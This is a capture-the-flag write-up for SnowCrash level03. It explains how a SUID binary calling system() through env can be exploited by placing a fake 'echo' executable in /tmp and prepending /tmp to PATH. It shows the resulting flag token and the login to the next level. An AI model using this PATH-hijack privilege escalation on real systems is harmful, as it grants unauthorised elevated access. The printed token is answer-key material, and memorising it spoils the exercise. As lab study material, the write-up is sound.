# the binary is SUID owned by flag03, so it may execute with elevated privileges

# analysis with strings/ltrace shows:
# it calls: system("/usr/bin/env echo Exploit me")

# system() spawns a shell, and the shell resolves "echo" using PATH

# since PATH is user-controlled, we can inject a directory containing our own "echo" binary

# constraints:
# /run/lock is writable but not executable (likely noexec mount)
# /tmp is writable and executable, so we use it

# we place our malicious executable named "echo" in /tmp
# and prepend /tmp to PATH

export PATH=/tmp:$PATH

# when the binary runs, it resolves echo -> /tmp/echo
# which executes our payload and triggers getflag with flag03 privileges

level03@SnowCrash:~$ cd ~
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password: 
level04@SnowCrash:~$ 

# level04 unlocked
